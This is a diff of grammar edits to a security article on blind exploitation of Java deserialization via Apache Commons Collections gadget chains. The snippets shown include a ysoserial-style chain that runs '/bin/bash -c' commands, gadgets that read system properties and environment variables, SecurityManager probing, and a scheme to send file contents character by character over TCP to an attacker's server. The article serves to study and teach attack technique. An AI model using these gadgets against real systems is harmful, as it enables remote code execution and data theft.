@@ -332,7 +332,7 @@ TransformerUtils.switchTransformer(
 
 This looks more complicated and consists of more sub-components.
 We created utility functions to make the gadget construction simpler, e.g., the sleeping gadget
-is an independent component and can be constructed by a dedicated method. For more see TODO: <-- :) .
+is an independent component and can be constructed by a dedicated method. For more see [part2].
 
 This construction can be easily generalized to a form `if (predicate) do action` where `action`
 can be
@@ -399,7 +399,7 @@ new InvokerTransformer("next",
         null)
 ```
 
-The result is string and we can call methods on it.
+The result is a string and we can call methods on it.
 
 ### Reading properties {#properties}
 There can be a lot of interesting stuff stored in the properties - e.g., username & password to the database.
@@ -447,14 +447,14 @@ System.getProperty("java.vendor");
 // Installation directory for Java Runtime Environment (JRE)
 System.getProperty("java.home");
 
-// Class path - what other interesting libraries we have?
+// Class path - what other interesting libraries do we have?
 System.getProperty("java.class.path");
 ```
 
-(Conversion to transformer chain is simple call of static method - was demonstrated earlier, for more info see source codes)
+(Conversion to transformer chain is a simple call of a static method - was demonstrated earlier, for more info see source codes)
 
 ### Reading environment variables {#systemenv}
-The same holds for environment variables - also valuable source of information.
+The same holds for environment variables - also a valuable source of information.
 
 ```java
 System.getenv("PATH");
@@ -467,7 +467,7 @@ Classical OS detection can be done via _nmap_
 nmap targethost.com -O -v
 ```
 
-But this scanning technique requires 1 open and 1 closed port to be reliable. Closed ports are problem to get because
+But this scanning technique requires 1 open and 1 closed port to be reliable. Closed ports are a problem to get because
 firewalls often filter incoming requests - SYN packet is dropped.
 
 ```java
@@ -478,7 +478,7 @@ System.getProperty("os.name").toLowerCase().contains("nux")
 System.getProperty("os.name").toLowerCase().contains("sunos")
 ```
 
-Another approach to OS detection (Windows vs. Linux vs. FreeBSD vs. MAC) is to check for file existence typically stored
+Another approach to OS detection (Windows vs. Linux vs. FreeBSD vs. MAC) is to check for the existence of files typically stored
 in differed locations on different systems, e.g., cmd.exe or ping, ifconfig, ipconfig, ip, telnet, netstat, ...
 Typical locations the command can be stored:
 
@@ -489,12 +489,12 @@ Typical locations the command can be stored:
 /usr/sbin
 ```
 
-### Sending character over a socket {#stringOverSocket}
+### Sending characters over a socket {#stringOverSocket}
 Guessing string characters by binary search requires some queries to do.
 It would be much faster if we could send individual characters over the socket to our server, assuming
-the socket approach works - system is not firewalled.
+the socket approach works - the system is not firewalled.
 
-As mentioned above it is not possible to use result as a method parameter. We cannot construct gadget
+As mentioned above, it is not possible to use the result as a method parameter. We cannot construct a gadget
 which directly sends a character over the socket. To overcome this limitation we can use
 [SwitchTransformer](#SwitchTransformer) and hack it a bit with enumeration:
 
@@ -509,22 +509,22 @@ else if (inp.equals("\u007f")) sendTcp(host, port, 0x7f)
 else                           sendTcp(host, port, 0xff) //unknown
 ```
 
-We already know its possible execute an action if predicate is true.
-To combine more such blocks [SwitchTransformer](#SwitchTransformer) can be used.
+We already know it's possible to execute an action if a predicate is true.
+To combine more such blocks, [SwitchTransformer](#SwitchTransformer) can be used.
 
-Its reasonable to support only ASCII characters to keep gadget size low.
+It's reasonable to support only ASCII characters to keep the gadget size low.
 We use this anyway for dumping config files - should not contain UTF8 strings.
 Note this is code heavy, payload like this occupies quite a lot of space.
 
 ### SecurityManager {#securityManager}
-Some methods may fail due to strict _SecurityManager_ settings. But usually it is not possible to tell Exceptions apart.
-To fingerprint the SecurityManager policy we can directly check if the particular operation is permitted before actually
+Some methods may fail due to strict _SecurityManager_ settings. But usually it is not possible to tell the Exceptions apart.
+To fingerprint the SecurityManager policy, we can directly check if the particular operation is permitted before actually
 executing it.
 
-The following gadgets throw SecurityException if given action is blocked by the policy.
+The following gadgets throw SecurityException if the given action is blocked by the policy.
 
 ```java
-// It is allowed to connecto to host:port?
+// Is it allowed to connect to host:port?
 System.getSecurityManager().checkConnect(host, port);
 
 // Execute command
@@ -543,8 +543,8 @@ System.getSecurityManager().checkPropertyAccess(property);
 ```
 
 ### Executing command, waiting for finish {#execWait}
-Since the expressive power of the transformer language is quite low
-we can use also another approach - call shell commands and signalize result with `sleep` as we did with `Thread.sleep()`.
+Since the expressive power of the transformer language is quite low, 
+we can also use another approach - call shell commands and signalize result with `sleep` as we did with `Thread.sleep()`.
 
 For this it would be great to call:
 
@@ -552,10 +552,10 @@ For this it would be great to call:
 Runtime.getRuntime().exec(new String[]{"/bin/bash", "-c", "something && sleep 7"}).waitFor();
 ```
 
-Shell gives us full expressive power. Unfortunately waitFor cannot be called, because exec() method returns
+Shell gives us full expressive power. Unfortunately waitFor cannot be called, because the exec() method returns
 package-local Process implementation which cannot be used with [InvokerTransformer](#InvokerTransformer).
 
-We can instead use the following hack to wait for process to finish.
+We can instead use the following hack to wait for a process to finish.
 
 ```java
 final String fname = "/tmp/.x" + Math.abs(rnd.nextInt());
@@ -565,9 +565,9 @@ final String[] exc = new String[] {"/bin/bash", "-c", "something && sleep 7; tou
 It performs the computation (something) and the blind sleep technique to return the output.
 Then it creates a temporary file and deletes it after
 a while. The file signalizes to our waiting Java thread the task has finished.
-For this to work we have to check if we are allowed to create and delete temporary files (SecurityManager, File.canWrite()).
+For this to work, we have to check if we are allowed to create and delete temporary files (SecurityManager, File.canWrite()).
 
-If yes it is still quite risky because it leaves traces. If something goes wrong the files will be left on the system.
+If we are, it is still quite risky because it leaves traces. If something goes wrong, the files will be left on the system.
 We can try to delete them from time to time, but still...
 
 Now we need a gadget that will sleep until it detects the temporary file our gadget created. For that we will make use of
@@ -579,20 +579,20 @@ for(i=0; i<80; i++)
 ```
 
 The for loop is here to avoid infinite loop on the file check - it defines the maximum amount of time to wait for process to complete.
-If something goes wrong and file does not get created the application would freeze. We don't want to DoS the application (yet) and attract attention.
-If the file gets created the loop quickly finishes and the page blocking ends.
+If something goes wrong and the file does not get created, the application would freeze. We don't want to DoS the application (yet) and attract attention.
+If the file gets created, the loop quickly finishes and the page blocking ends.
 
 ## Conclusion {#conclusion}
 
-We aimed to demonstrate the exploitation in restricted environments with use of blind technique, inspired by
-Blind SQL Injection attacks. With given gadgets its possible to gather interesting information about the target
+We aimed to demonstrate the exploitation in restricted environments with the use of blind technique, inspired by
+Blind SQL Injection attacks. With given gadgets it's possible to gather interesting information about the target
 system and maybe mount another attacks which would not be possible via deserialization vulnerability otherwise.
 
 We made utilities to generate the payloads and to test them before using them on real targets.
 This is especially useful to test blind techniques like string guessing with bisection.
 Our further work is to automate this exploitation technique in the same way as [sqlmap] does.
 
-If you like to know more on gadget constructions and limitations, keep reading.
+If you'd like to know more on gadget constructions and limitations, keep reading.
 
 ## Digging deeper - Theory {#deeper}
 In the following section we will take a closer look on gadget constructions and tool arsenal we can use for that.
@@ -600,7 +600,7 @@ In the following section we will take a closer look on gadget constructions and 
 ### Basic commons1 exploit chain {#commons1}
 
 In order to understand how the gadgets are constructed and executed on the target
-machine lets go through the gadget taken from [ysoserial] project - RCE.
+machine, let's go through the gadget taken from the [ysoserial] project - RCE.
 
 ```java
 final Transformer[] transformers = new Transformer[] {
@@ -634,16 +634,16 @@ The code essentially aims to execute the following:
 Runtime.getRuntime().exec(new String[]{"/bin/bash", "-c", "sleep 5"});
 ```
 
-This needs a rewriting a bit because we cannot construct gadget exactly like this.
+This needs rewriting a bit because we cannot construct the gadget exactly like this.
 We need to use some Transformer from our toolbox to do the job.
-_[ConstantTransformer](#ConstantTransformer)_ accepts serializable object, so we initialize it with `Runtime.class` which
+_[ConstantTransformer](#ConstantTransformer)_ accepts a serializable object, so we initialize it with `Runtime.class` which
 is serializable. Then we can chain multiple invocations with _[InvokerTransformer](#InvokerTransformer)_
 
 ```java
 ((Runtime) (Runtime.class.getMethod("getRuntime").invoke(null))).exec(new String[]{"/bin/bash", "-c", "sleep 5"});
 ```
 
-After translation to Transformer language the final code that gets executed on the host looks like this:
+After translation to Transformer language, the final code that gets executed on the host looks like this:
 
 ```java
 // Constant transformer 1
@@ -665,7 +665,7 @@ method = cls.getMethod("exec", String[].class);
 input = method.invoke(input, new Object[]{new String[]{"/bin/bash", "-c", "sleep 5"}});
 ```
 
-## Language and expresivity {#lang}
+## Language and expressivity {#lang}
 There are 3 basic types of objects in the Commons language we can use to build our payload / gadgets.
 
 *  Transformers
@@ -765,7 +765,7 @@ List of the Closures:
 [TransformerClosure](#TransformerClosure),
 [WhileClosure](#WhileClosure).
 
-### Expresivity {#expressivity}
+### Expressivity {#expressivity}
 Using the given tools we can construct chains which perform something actually useful.
 
 Using _[ConstantTransformer](#ConstantTransformer)_ and _[InvokerTransformer](#InvokerTransformer)_
@@ -775,17 +775,17 @@ we can construct chains like this:
 SerializableConstant.method1(const).method2(const)....methodN(const);
 ```
 
-This is followed also by _[ysoserial]_ exploit, very easy one. Few important things to notice:
+This is followed also by _[ysoserial]_ exploit, very easy one. A few important things to notice:
 
 #### Serializable static chain start
  _ConstantTransformer_ can accept only Serializable objects in order to work in payload. e.g.,
  _String_, _File_, _Class_, _Object[]_, _Long_, ...
 
- On the other hand we can start with different Transformer, e.g., _[InstantiateTransformer](#InstantiateTransformer)_
+ On the other hand, we can start with a different Transformer, e.g., _[InstantiateTransformer](#InstantiateTransformer)_
  to create a new instance as a start of the chain.
 
 #### Serializable static method arguments
-Due to _[InvokerTransformer](#InvokerTransformer)_ internal mechanism, we cannot pass result of the computation as a
+Due to _[InvokerTransformer](#InvokerTransformer)_ internal mechanism, we cannot pass the result of the computation as a
 method argument. All method arguments have to be also Serializable objects, created in time of payload
 generation. E.g., it is not possible to construct a gadget like:
 `sendFile(readFile("/etc/passwd"));`
@@ -798,7 +798,7 @@ For example it is not possible to do:
 Runtime.getRuntime().exec(cmd).waitFor();
 ```
 
-The reason is the returned object after `exec(cmd)` is expected to be a _Process_ object so according to the interface.
+The reason is the returned object after `exec(cmd)` is expected to be a _Process_ object according to the interface.
 Thus it should be possible to call `waitFor` method. But the real returned object is `UNIXProcess` (in my case)
 which is _package local_. _[InvokerTransformer](#InvokerTransformer)_ essentially does:
 
@@ -810,11 +810,11 @@ return method.invoke(input, iArgs);
 
 Reflection call on the package local object fails, the method is not accessible. We could try to hack it with calling
 `input.getMethod("waitFor).setAccessible(true)` but then we would need to do `waitForMethod.invoke(process)`
-- object to call method on is the first argument of _invoke_ method. But as we mentioned in point above, we cannot pass results as arguments
+- object to call method on is the first argument of _invoke_ method. But as we mentioned in the point above, we cannot pass results as arguments
  in our gadgets.
 
 ### Closures and predicates
-With using Closures and Predicates we can do even more things and express complicated code paths.
+Using Closures and Predicates, we can do even more things and express complicated code paths.
 So far we called a method on a previously returned result. At some point we may need to
 call methods on the same object multiple times.
 
@@ -825,7 +825,7 @@ os.write(0x23);
 os.write(0x34);
 ```
 
-As Closure accepts input, processes it and returns the same input we can use them for this. Note the result of Closure computation
+As Closures accept input, process it and return the same input, we can use them for this. Note the result of Closure computation
 is ignored. The key part here is [ClosureTransformer](#ClosureTransformer)
 
 ```
@@ -846,7 +846,7 @@ is ignored. The key part here is [ClosureTransformer](#ClosureTransformer)
 ```
 
 With closures we can express very simple branching and looping, it forms a simple language.
-Key components here are conversion classes:
+Key components here are the conversion classes:
 
 * [TransformerClosure](#TransformerClosure) : Wraps Transformer in Closure
 * [ClosureTransformer](#ClosureTransformer) : Wraps Closure in Transformer
@@ -855,19 +855,19 @@ Key components here are conversion classes:
 Predicates can be easily combined together in an intuitive way (not, or, and, for all).
 
 ## Conclusion 2
-Thats all for now on the gadget construction. If you happen to find another interesting gadget
+That's all for now on the gadget construction. If you happen to find another interesting gadget, 
 leave us a note either on email or twitter, we will add it to the list.
 
 Thanks for reading.
 
-## Glossary - how does it work from the inside
+## Glossary - how it works from the inside
 Here follows the list of usable tools we can use in gadget construction in Apache Commons exploits.
 Only the core code is present for each one so one can quickly get the functionality of the component.
 
-Package for all predicates, closures and transformers is `org.apache.commons.collections.functors`
+Package for all predicates, closures and transformers is `org.apache.commons.collections.functors`.
 
 ## Predicate glossary
-All predicates follows.
+All predicates follow.
 
 ### TruePredicate {#TruePredicate}
 ```java
@@ -1038,7 +1038,7 @@ public boolean evaluate(Object object) {
 
 ### TransformerPredicate {#TransformerPredicate}
 Essential predicate that takes transformer output.
-With this we can construct gadgets like: `if (string.isEmpty()) Thread.sleep(7000);`
+With this we can construct gadgets like: `if (string.isEmpty()) Thread.sleep(7000);`.
 
 ```java
 public boolean evaluate(Object object) {
@@ -1214,7 +1214,7 @@ public Object transform(Object input) {
 ### InstantiateTransformer {#InstantiateTransformer}
 Can be seen as a syntactic sugar - looks for constructor and instantiates a class.
 This can be done also with [ConstantTransformer](#ConstantTransformer) and [InvokerTransformer](#InvokerTransformer).
-The benefit is payload is smaller when using this Transformer for the purpose.
+The benefit is the payload is smaller when using this Transformer for the purpose.
 
 ```java
 public Object transform(Object input) {
